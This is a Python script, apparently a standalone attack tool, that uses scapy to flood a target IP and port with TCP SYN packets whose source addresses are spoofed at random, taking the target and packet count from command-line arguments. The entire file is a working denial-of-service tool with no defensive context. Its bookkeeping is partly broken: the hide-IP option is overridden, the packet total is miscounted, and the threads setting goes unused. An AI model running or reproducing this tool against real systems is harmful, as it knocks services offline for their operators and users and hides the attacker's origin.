#!/usr/bin/env python3

import argparse
import random
import sys

import socket

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

# Default values #
DEFAULT_PACK = 999999999
MAX_PORTS = 65535

def random_IP():
    IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return IP


def assign_args():
    target_ip = sys.argv[1]
    dPort = int(sys.argv[2])
    packets = int(sys.argv[3])
    threads = int(sys.argv[4])
    i = sys.argv[5]
    hide_ip = False
    if i == 'True':
        hide_ip = True
    elif i == 'False':
        hide_ip = False
    else:
        raise ValueError
    return target_ip, dPort, packets, threads, hide_ip


def SYN_flood(ip, dPort, packets_to_send, threads, hide_ip):
    print("executing SYN Flooder with the following configurations"
          + "\nsource ip: " + socket.gethostbyname(socket.gethostname())
          + "\ntarget_ip: " + ip
          + "\ndPort: " + str(dPort)
          + "\ntotal packets to send: " + str(packets_to_send)
          + "\nthreads: " + str(threads))
    total_packets = 0

    for i in range(packets_to_send):
        seq_n = random.randint(0, MAX_PORTS)
        sPort = random.randint(0, MAX_PORTS)
        Window = random.randint(0, MAX_PORTS)

        if hide_ip == True:
            src_ip = random_IP()
        elif hide_ip == False:
            src_ip = socket.gethostbyname(socket.gethostname())
        else:
            raise ValueError

        src_ip = random_IP()
        packet = IP(dst=ip, src=src_ip) / TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)
        total_packets += packets_to_send
        if hide_ip == True:
            print("["+str(i+1)+"] sending " + str(packets_to_send) + " to " + ip + " as " + str(src_ip))
        else:
            print("["+str(i+1)+"] sending " + str(packets_to_send) + " to " + ip + " as " + socket.gethostbyname(socket.gethostname()))


    print("Total packets sent: " + str(total_packets))


def main():
    ip, port, packets, threadsCount, hide_ip = assign_args()
    SYN_flood(ip=ip, dPort=port, packets_to_send=packets, threads=threadsCount, hide_ip=hide_ip)

if __name__ == "__main__":
    main()